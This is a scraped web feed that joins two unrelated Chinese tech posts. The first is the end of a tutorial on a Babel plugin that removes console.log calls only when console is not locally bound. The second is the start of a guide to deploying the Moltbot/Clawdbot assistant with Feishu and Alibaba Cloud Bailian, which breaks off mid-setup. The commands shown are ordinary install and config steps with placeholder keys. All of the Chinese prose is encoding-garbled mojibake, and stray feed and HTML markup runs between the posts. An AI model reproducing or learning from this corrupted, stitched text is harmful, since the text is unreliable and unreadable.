<p>Babel çš„ <code>path.scope</code> æä¾›äº†å¼ºå¤§çš„ä½œç”¨åŸŸåˆ†æèƒ½åŠ›ã€‚ æˆ‘ä»¬éœ€è¦æ£€æŸ¥ï¼š<code>console</code> è¿™ä¸ªå¼•ç”¨ï¼Œæ˜¯å¦<strong>ç»‘å®š(Binding)</strong> åˆ°äº†å…¨å±€ï¼Ÿè¿˜æ˜¯è¢«å±€éƒ¨å˜é‡è¦†ç›–äº†ï¼Ÿ</p>
<p><strong>ä¼˜åŒ–åçš„ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">CallExpression</span>(path) {
  <span class="hljs-selector-tag">const</span> { <span class="hljs-selector-tag">callee</span> } = <span class="hljs-selector-tag">path</span><span class="hljs-selector-class">.node</span>;
  <span class="hljs-selector-tag">if</span> (t.<span class="hljs-built_in">isMemberExpression</span>(callee) &amp;&amp; 
      t.<span class="hljs-built_in">isIdentifier</span>(callee.object, { <span class="hljs-attribute">name</span>: <span class="hljs-string">'console'</span> }) &amp;&amp;
      t.<span class="hljs-built_in">isIdentifier</span>(callee.property, { <span class="hljs-attribute">name</span>: <span class="hljs-string">'log'</span> })) {

    <span class="hljs-comment">// ã€æ–°å¢ã€‘æ ¸å¿ƒæ£€æŸ¥ï¼šè·å– 'console' è¿™ä¸ªæ ‡è¯†ç¬¦çš„ç»‘å®šä¿¡æ¯</span>
    <span class="hljs-selector-tag">const</span> <span class="hljs-selector-tag">binding</span> = <span class="hljs-selector-tag">path</span><span class="hljs-selector-class">.scope</span><span class="hljs-selector-class">.getBinding</span>(<span class="hljs-string">'console'</span>);
    
    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰ç»‘å®šï¼ˆè¯´æ˜æ˜¯å…¨å±€å˜é‡ï¼‰ï¼Œæ‰åˆ é™¤</span>
    <span class="hljs-selector-tag">if</span> (!binding) {
      <span class="hljs-selector-tag">path</span><span class="hljs-selector-class">.remove</span>();
    }
  }
}
</code></pre>
<p>ç°åœ¨ï¼ŒBabel èƒ½å¤Ÿè¯†åˆ«å‡ºå±€éƒ¨å˜é‡ <code>console</code>ï¼Œä»è€Œæ”¾è¿‡å®ƒã€‚</p>
<hr/>
<h2 data-id="heading-12">äº”ã€ æ€»ç»“ä¸è„‘æ´ï¼šBabel è¿˜èƒ½å¹²ä»€ä¹ˆï¼Ÿ</h2>
<p>é€šè¿‡è¿™ä¸ªç®€å•çš„ä¾‹å­ï¼Œä½ æŒæ¡äº† Babel æ’ä»¶çš„ç²¾é«“ï¼š<strong>Find (Visitor) -&gt; Check (Path/Types) -&gt; Modify (Remove/Replace)</strong> ã€‚</p>
<p>åœ¨æ¶æ„è®¾è®¡ä¸­ï¼ŒBabel æ’ä»¶æœ‰æ— é™çš„æ½œåŠ›ï¼š</p>
<ol>
<li><strong>è‡ªåŠ¨åŸ‹ç‚¹ï¼š</strong> æ‰¾åˆ°æ‰€æœ‰çš„ Click äº‹ä»¶å‡½æ•°ï¼Œåœ¨å‡½æ•°ä½“ç¬¬ä¸€è¡Œè‡ªåŠ¨æ’å…¥ <code>track('click')</code> ä»£ç ã€‚</li>
<li><strong>å›½é™…åŒ– (i18n) æå–ï¼š</strong> æ‰«ææ‰€æœ‰ä¸­æ–‡å­—ç¬¦ä¸²ï¼Œè‡ªåŠ¨æå–åˆ° JSON æ–‡ä»¶ä¸­ï¼Œå¹¶æ›¿æ¢ä¸º <code>t('key')</code>ã€‚</li>
<li><strong>ä»£ç å«å£«ï¼š</strong> ç¦æ­¢ä½¿ç”¨æŸäº›è½åçš„ APIï¼Œä¸€æ—¦å‘ç°ç›´æ¥æ„å»ºæŠ¥é”™ï¼ˆæ¯” ESLint æ›´æš´åŠ›ï¼‰ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-13">ç»“è¯­ï¼šä»æ‰‹æœ¯åˆ€åˆ°å®ˆé—¨å‘˜</h2>
<p>æˆ‘ä»¬ç°åœ¨å·²ç»æ‹¥æœ‰äº†ä¿®æ”¹ä»£ç çš„æ‰‹æœ¯åˆ€ï¼ˆBabel Pluginï¼‰ã€‚ ä½†æ˜¯ï¼Œæ‰‹æœ¯åˆ€å¤ªé”‹åˆ©äº†ï¼Œå®¹æ˜“ä¼¤äººã€‚åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œæˆ‘ä»¬æ›´å¤šæ—¶å€™ä¸éœ€è¦â€œä¿®æ”¹â€ä»£ç ï¼Œè€Œæ˜¯éœ€è¦â€œæ£€æŸ¥â€ä»£ç ï¼Œæˆ–è€…è¿›è¡Œå¤§è§„æ¨¡çš„ã€å®‰å…¨çš„â€œè‡ªåŠ¨åŒ–é‡æ„â€ã€‚</p>
<p>è¿™æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å¦ä¸€å¥—åŸºäº AST çš„å·¥å…·ä½“ç³»ã€‚</p>
<blockquote>
<p><strong>Next Step:</strong> æ—¢ç„¶æˆ‘ä»¬èƒ½åˆ†æä»£ç ç»“æ„ï¼Œé‚£æ˜¯ä¸æ˜¯å¯ä»¥åˆ¶å®šä¸€å¥—â€œä»£ç æ³•å¾‹â€ï¼Ÿ ä¸‹ä¸€èŠ‚ï¼Œæˆ‘ä»¬å°†æ¢è®¨**ã€Šç¬¬ä¸‰ç¯‡ï¼šå·¥å…·â€”â€”ä»£ç è´¨é‡çš„å®ˆé—¨å‘˜ï¼šESLint åŸç†ã€è‡ªå®šä¹‰è§„åˆ™ä¸ Codemod è‡ªåŠ¨åŒ–é‡æ„ã€‹**ã€‚æˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•ç¼–å†™è‡ªå®šä¹‰çš„ ESLint è§„åˆ™ï¼Œä»¥åŠå¦‚ä½•ç”¨ Codemod ç¬é—´ä¿®æ”¹ 1000 ä¸ªæ–‡ä»¶ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[clawbotæ¥å…¥é£ä¹¦é˜¿é‡Œäº‘ï¼Œç«‹å³æ‹¥æœ‰24å°æ—¶AIåŠ©ç†è´¾ç»´æ–¯]]></title>    <link>https://juejin.cn/post/7600581247019646985</link>    <guid>https://juejin.cn/post/7600581247019646985</guid>    <pubDate>2026-01-29T07:36:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600581247019646985" data-draft-id="7600344784945971246" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="clawbotæ¥å…¥é£ä¹¦é˜¿é‡Œäº‘ï¼Œç«‹å³æ‹¥æœ‰24å°æ—¶AIåŠ©ç†è´¾ç»´æ–¯"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-29T07:36:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ˜ŸAIå·¥ä½œå®¤"/> <meta itemprop="url" content="https://juejin.cn/user/2250051536050763"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            clawbotæ¥å…¥é£ä¹¦é˜¿é‡Œäº‘ï¼Œç«‹å³æ‹¥æœ‰24å°æ—¶AIåŠ©ç†è´¾ç»´æ–¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2250051536050763/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ˜ŸAIå·¥ä½œå®¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T07:36:31.000Z" title="Thu Jan 29 2026 07:36:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/037387fb52d84e4bae719b4a77f07add~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=ysfCNmMQVboTgEw0n1g%2BMrHdQAQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å“ˆå–½å¤§å®¶å¥½ï¼Œ</p>
<p>æˆ‘æ˜¯é˜¿æ˜ŸğŸ‘‹</p>
<p>æœ€è¿‘clawbotå¤ªç«äº†ï¼Œé˜¿æ˜Ÿä»Šå¤©å°±è·Ÿå¤§å®¶ä»‹ç»éƒ¨ç½²clawçš„æ–¹æ³•ã€‚</p>
<p>è¿™å¼ å›¾æ˜¯æˆ‘å’ŒÂ <strong>æ–°AIè€å…¬claw</strong>Â çš„èŠå¤©è®°å½•ã€‚èŠå®Œæˆ‘å°±æŠŠè€å…¬åˆ äº†ï¼ŒAIè€å…¬å¤ªå¤šäº†ğŸ˜‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3767ffe38f3742308d68efa35913bbd5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=smzeXvpxVGj%2Buo3bjMQPIbspfXU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä»Šå¤©è®²2ä¸ªæ–¹æ¡ˆã€‚</p>
<p>ä¸€ä¸ªæ˜¯éº»çƒ¦ä½†æ˜¯å¯ä»¥è£…xçš„é£ä¹¦ï¼Œ</p>
<p>ä¸€ä¸ªæ˜¯ä¸éº»çƒ¦ä½†æ˜¯ä¸å¤ªå¥½è£…çš„é˜¿é‡Œäº‘ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/360a49373a6a443792066bea7f729687~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=qqEL4ApEh6zw44VDYvzpTi8a0%2Bg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒæƒ…ç»ªä»·å€¼è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œ</p>
<p>å½“ç„¶äº†å’±ä»¬ç”¨çš„æ˜¯åƒé—®çš„æ¨¡å‹ä¸è¦æƒ³ä¸è¯¥æƒ³çš„ã€‚</p>
<p>ä½ è¦æ¢æˆå…¶ä»–æ¨¡å‹é‚£å°±â€¦â€¦</p>
<h2 data-id="heading-0">clawbotæ˜¯å•¥</h2>
<p><strong>Moltbot</strong>ï¼ˆåŸ Clawdbotï¼‰ æ˜¯ä¸€æ¬¾å¼€æºçš„ AI ä¸ªäººåŠ©æ‰‹ï¼Œæ”¯æŒæœ¬åœ°éƒ¨ç½²ï¼Œ</p>
<p>å…¼å®¹ MacOSã€Windows åŠ Linux ç­‰å¤šç§ç³»ç»Ÿï¼Œ</p>
<p>æ”¯æŒæ¥å…¥å¸¸ç”¨èŠå¤©å·¥å…·ï¼Œè®©ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡è‡ªç„¶è¯­è¨€æ¥æ§åˆ¶å„ç§è®¾å¤‡å’ŒæœåŠ¡ã€‚</p>
<p>æ¯”å¦‚ä»–çš„ä½œç”¨åŒ…æ‹¬ä½†ä¸é™äºâ€”â€”</p>
<blockquote>
<p>24å°æ—¶åœ¨çº¿çš„ AI åŠ©æ‰‹</p>
<p>è‡ªåŠ¨åŒ–é‚®ä»¶ã€æ—¥ç¨‹ã€æé†’ç­‰</p>
<p>ä¸ªäººçŸ¥è¯†åº“ï¼Œéšæ—¶å›ç­”ä½ çš„é—®é¢˜</p>
</blockquote>
<h2 data-id="heading-1">æ–¹æ¡ˆä¸€ï¼šé€šè¿‡é£ä¹¦æ¥å…¥</h2>
<h2 data-id="heading-2">éƒ¨ç½²clawbot</h2>
<p>æœ¬åœ°è¿˜æ²¡clawbotçš„éœ€è¦å…ˆä¸‹è½½ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/moltbot/moltbot.git
<span class="hljs-built_in">cd</span> moltbot

pnpm install
pnpm ui:build <span class="hljs-comment"># auto-installs UI deps on first run</span>
pnpm build

pnpm moltbot onboard --install-daemon

<span class="hljs-comment"># Dev loop (auto-reload on TS changes)</span>
pnpm gateway:watch
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/494ce102c55b42a8a7c39c2279a3e6d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=SvoAuGSFB1GnDJmBDu5sBlviBpY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ³¨æ„ç¡®è®¤ Node.js ç‰ˆæœ¬ï¼Œclawdbot è¦æ±‚ Node &gt;=22ã€‚</p>
<p>å¦‚æœä¸æ˜¯ 22+ï¼Œéœ€è¦å…ˆå‡çº§ Node ï¼ˆä½ ç”¨ nvm / fnm / brew éƒ½è¡Œï¼‰</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccd75841dc7e4f2292aa933b20c18c5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=TZwVMnYYu%2FOomYb2jWJqOJ%2FG0Kw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®‰è£…ä¹‹åï¼Œä¼šé—®ä½ å‡ ä¸ªé—®é¢˜ï¼Œä¾æ¬¡é€‰æ‹©é€‰æ‹© â€œYesâ€ã€é€‰æ‹© â€œQuickStartâ€ã€"Skip for now"ã€"All providers"ã€é»˜è®¤é…ç½®ã€â€œSkip for nowâ€ã€â€œNoâ€å³å¯ã€‚åæ­£å°±æ˜¯é‚£ç§äº‹å„¿å¤šçš„è¦æ±‚å…ˆä¸å¤„ç†ã€‚</p>
<h2 data-id="heading-3"><strong>åˆ›å»ºé£ä¹¦æœºå™¨äºº</strong></h2>
<p>è¿™æ˜¯å®ç°Â  <strong>â€œåœ¨é£ä¹¦é‡Œè·Ÿä½ çš„clawbotâ€</strong> Â çš„å…³é”®ã€‚</p>
<ol>
<li>1.Â <strong>é€ ä¸ªåº”ç”¨</strong>Â ï¼šç™»å½•Â <strong>é£ä¹¦å¼€æ”¾å¹³å°</strong>Â ï¼Œç‚¹å‡»Â <strong>ã€Œåˆ›å»ºä¼ä¸šè‡ªå»ºåº”ç”¨ã€</strong>Â ã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd85db4985404d57bcf2e21e8eeb1da1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=Wr56Iwi06i%2FnikVp0b2OfXbhSCI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ol>
<li>2.Â <strong>æ·»åŠ æœºå™¨äºº</strong>Â ï¼šåœ¨åº”ç”¨é‡Œï¼Œæ‰¾åˆ°Â  <strong>â€œæ·»åŠ åº”ç”¨èƒ½åŠ›â€ -&gt; â€œæœºå™¨äººâ€</strong> Â ï¼Œæ‰“å¼€å®ƒã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f119397405e46219deb5e9bdbbd5a7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=7WXEhXG4UY9Rp3mTMGYkuDoBX4o%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ol>
<li>
<p>3.Â <strong>ç»™è¶³æƒé™</strong>Â ï¼ˆåœ¨ã€Œæƒé™ç®¡ç†ã€é‡Œæœï¼Œè¿™å‡ ä¸ªå¿…é¡»å‹¾ä¸Šï¼‰ï¼š</p>
<p>Â  è·å–ç”¨æˆ·åŸºæœ¬ä¿¡æ¯</p>
<p>Â  è·å–ç¾¤ç»„ä¿¡æ¯</p>
<p>Â  è·å–ä¸å‘é€å•èŠã€ç¾¤ç»„æ¶ˆæ¯</p>
<p>Â  æŸ¥çœ‹æ¶ˆæ¯è¡¨æƒ…å›å¤</p>
<p>Â  â€¦â€¦</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/962570bc5a3a40cca8dfa16d5ee3057b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=BWH%2Bh2yRejcZzddZ65TRvlCIk6U%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
</li>
<li>
<p>4.Â <strong>æ‹¿å¥½å‡­è¯</strong>Â ï¼šåœ¨Â <strong>ã€Œå‡­æ®ä¸åŸºç¡€ä¿¡æ¯ã€</strong>Â é‡Œï¼Œå¤åˆ¶Â <strong>App ID</strong>Â å’ŒÂ <strong>App Secret</strong>Â ï¼Œä¸‹ä¸€æ­¥é©¬ä¸Šç”¨ã€‚</p>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/196abd3288b946e88112dda18da77b1a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=xZCm7%2Bx33zwZa%2BHTT5OyatrMQ64%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-4">æ ¸å¿ƒè”é€šï¼šå¯¹é½â€œclawå¤§è„‘â€ä¸é£ä¹¦</h2>
<p>æ¥ä¸‹æ¥ï¼Œè¯·åœ¨ç»ˆç«¯ä¾æ¬¡æ‰§è¡Œè¿™ä¸‰æ­¥</p>
<h3 data-id="heading-5"><strong>1ã€å®‰è£…é£ä¹¦æ’ä»¶</strong></h3>
<pre><code class="hljs language-bash" lang="bash">clawdbot plugins install @m1heng-clawd/feishu
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b392763bf124935a37f4934661914f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=zVKcVpe0FsK3%2Fav1Uzf8J7ICtJ0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å°±å¯ä»¥çœ‹åˆ°æ’ä»¶å·²ç»å®‰è£…æˆåŠŸäº†</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7d59b660e814b258a48efb2c51baad9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=jCggQqH9E17T6NNhTr5eq%2F2f%2B1k%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æŸ¥çœ‹æ˜¯å¦å·²è‡ªåŠ¨åŠ è½½å·²å®‰è£…çš„é£ä¹¦æ’ä»¶ã€‚</p>
<pre><code class="hljs language-perl" lang="perl">clawdbot plugins list | <span class="hljs-keyword">grep</span> feishu
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e20ca69cd19d401887bc0af702bf9195~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=pZTlvCkG8VNGAmr%2BGjYJ3KhkQsg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-6"><strong>2ã€é…ç½®ç™¾ç‚¼â€œå¤§è„‘â€ (è§£å†³ 404 ä¸åè®®é—®é¢˜)ï¼š</strong></h3>
<p>ç”±äº Moltbot æºç ç‰ˆå¯¹ä¾›åº”å•†åè®®çš„è¯†åˆ«å­˜åœ¨åå·®ã€‚</p>
<p>å¦‚æœä½ å‰é¢èƒ¡ä¹±æ¯é¥¬äº†é…ç½®è¿™é‡Œå°±å®¹æ˜“å‡ºé”™ã€‚</p>
<p>æˆ‘ä»¬å°†å¼ºåˆ¶ä½¿ç”¨å®˜æ–¹æ¨èçš„Â <code>bailian</code>Â æ¨¡å¼ï¼Œ</p>
<p>æ­¤å‘½ä»¤å¼ºè¡Œå¼€å¯Â <code>openai-completions</code>Â åè®®æ¨¡å¼ï¼Œç¡®ä¿è¯·æ±‚ç²¾å‡†å‘½ä¸­é˜¿é‡Œäº‘ APIã€‚</p>
<blockquote>
<p><em>è¯·å°†</em> <em><code>ä½ çš„API-KEY</code></em> <em>æ›¿æ¢ä¸ºé˜¿é‡Œäº‘ç™¾ç‚¼åå°æ‹¿åˆ°çš„çœŸå® Keyã€‚</em></p>
</blockquote>
<pre><code class="hljs language-swift" lang="swift">clawdbot config <span class="hljs-keyword">set</span> models.providers.bailian '{<span class="hljs-string">"baseUrl"</span>:<span class="hljs-string">"https://dashscope.aliyuncs.com/compatible-mode/v1"</span>,<span class="hljs-string">"apiKey"</span>:<span class="hljs-string">"ä½ çš„API-KEY"</span>,<span class="hljs-string">"api"</span>:<span class="hljs-string">"openai-completions"</span>,<span class="hljs-string">"models"</span>:[{<span class="hljs-string">"id"</span>:<span class="hljs-string">"qwen-vl-plus"</span>,<span class="hljs-string">"name"</span>:<span class="hljs-string">"Qwen VL Plus"</span>}]}'
</code></pre>
<h3 data-id="heading-7"><strong>3ã€ç»‘å®šé£ä¹¦å¹¶é‡å¯ç½‘å…³</strong></h3>
<blockquote>
<p><em>è¯·æ›¿æ¢ä¸ºä½ è‡ªå·±çš„**é£ä¹¦</em> <em><code>AppID</code></em> <em>å’Œ</em> <em><code>Secret</code>**ã€‚</em></p>
</blockquote>
<p>Bash</p>
<pre><code class="hljs language-swift" lang="swift">clawdbot config <span class="hljs-keyword">set</span> channels.feishu '{<span class="hljs-string">"enabled"</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">"appId"</span>:<span class="hljs-string">"ä½ çš„AppID"</span>,<span class="hljs-string">"appSecret"</span>:<span class="hljs-string">"ä½ çš„AppSecret"</span>,<span class="hljs-string">"connectionMode"</span>:<span class="hljs-string">"websocket"</span>,<span class="hljs-string">"groupPolicy"</span>:<span class="hljs-string">"open"</span>}'
